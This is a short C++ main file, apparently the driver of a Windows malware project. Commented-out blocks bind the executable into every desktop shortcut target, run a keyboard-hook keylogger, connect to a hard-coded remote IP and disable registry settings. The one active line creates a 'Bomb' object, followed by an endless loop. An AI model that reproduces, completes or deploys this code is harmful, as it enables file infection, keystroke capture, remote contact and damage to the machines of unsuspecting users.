#include "Reality.hpp"

#include <iostream>
#include <thread>

int	main(int argc, char** argv) {
	/*EXEBinder exeBinder;
	if(exeBinder.AmIBinded(argv[0])) {
		exeBinder.Open(argv[0]);

		return EXIT_SUCCESS;
	}

	std::vector<std::string> files;
	Miscellaneous().GetAllShortcutsTargetFromDesktop(files);
	std::for_each(files.begin(), files.end(), [&exeBinder, argv] (std::string& file) {
		std::vector<std::string> files { file };
		exeBinder.Bind(files, file, argv[0]);
	});*/



	/*std::thread threadKeylogger([] {
		std::function<void(PKBDLLHOOKSTRUCT)> klCallback = [] (PKBDLLHOOKSTRUCT key) {
			std::cout << Keylogger::vkCodesAll[key->vkCode] << " ";
		};
		Keylogger kl(klCallback);

		while(kl.Update());
	});
	threadKeylogger.detach();*/



	/*BClient bClient(DefaultSocketConfigurations::TCP, 32406, "162.55.32.18");
	bClient.Connect();
	bClient.ReceiveData();
	bClient.SendData("Salut");
	bClient.Disconnect();*/



	/*Registry registry;
	registry.DisableAll(true);*/



	Bomb bomb;



	while(true) {
		Sleep(1);
	}

	return EXIT_SUCCESS;
}